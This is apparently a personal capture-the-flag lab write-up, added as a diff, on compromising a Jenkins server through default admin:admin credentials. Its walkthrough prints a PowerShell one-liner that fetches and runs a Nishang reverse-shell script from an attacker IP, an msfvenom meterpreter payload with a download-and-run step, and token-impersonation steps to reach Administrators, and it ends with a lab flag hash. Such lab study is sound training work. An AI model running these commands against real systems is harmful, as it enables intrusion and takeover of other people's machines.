@@ -1,0 +1,84 @@
+Teaches how to exploit a common misconfiguration on a widely used automation server(Jenkins - tool used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it)
+
+GIT REP USED: https://github.com/samratashok/nishang
+
+Step no1.:
+
+nmap -sC -v IP
+
+reveals websites, on port 80 and 8080, respectively static html site with an email address and a login pane, with admin:admin as credentials
+
+this takes us to jenkins, the website management software
+
+under project → configure, at the bottom we have a pane that allows us to input commands that’ll be executed in system’s CMD
+
+in order to get a rev shell, we need to clone said repo, set up a python simple http server inside the directory, input below command:
+
+`powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.6.40:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.6.40 -Port 8888`
+
+and ‘build’ the project, which basically means run (its somewhere in the options)
+
+this pulls the script from github repo using our python server, executes the script using powershell, and sends us a reverse shell right to our nc listener
+
+Step no2.:
+
+Switching shells 
+
+so, now that we have our shell and its easily replicable 
+
+we need to generate a meterpreter payload that is encoded and has our callback info
+
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`
+
+then, we can pull it to the sys with:
+
+`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')”`
+
+next, set up metasploit multi/handler, get our shell again, and type
+
+`Start-Process "shell-name.exe”`
+
+to execute meterpreter payload and catch our shell using multi/handler 
+
+Step no3.:
+
+Privesc
+
+this was a part that took the shortest, it comes down to token impersonation:
+
+[[WIN]MAN. PRIVESC](https://www.notion.so/WIN-MAN-PRIVESC-d03def56941b49ee8de2400c265459b4)
+
+used commands:
+
+`meterpreter > shell` 
+
+inside the shell:
+
+`whoami /priv`
+
+in output, we can notice that below privilege is enabled: 
+
+`SeImpersonatePrivilege          Impersonate a client after authentication       Enabled`
+
+so, in meterpreter, we execute command:
+
+`load incognito`
+
+next, lets enumerate which token we are able to impresonate using:
+
+`list_tokens -g`
+
+We can see that the *BUILTIN\Administrators* token is available. Use the 
+
+`impersonate_token "BUILTIN\Administrators"` 
+
+command to impersonate the Administrators token
+
+Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the *ps* command to view processes and find the PID of the services.exe process. Migrate to this process using the command 
+
+`migrate PID`
+
+aand:
+
+`meterpreter > cat root.txt`
+`��dff0f748678f280250f25a45b8046b4a`
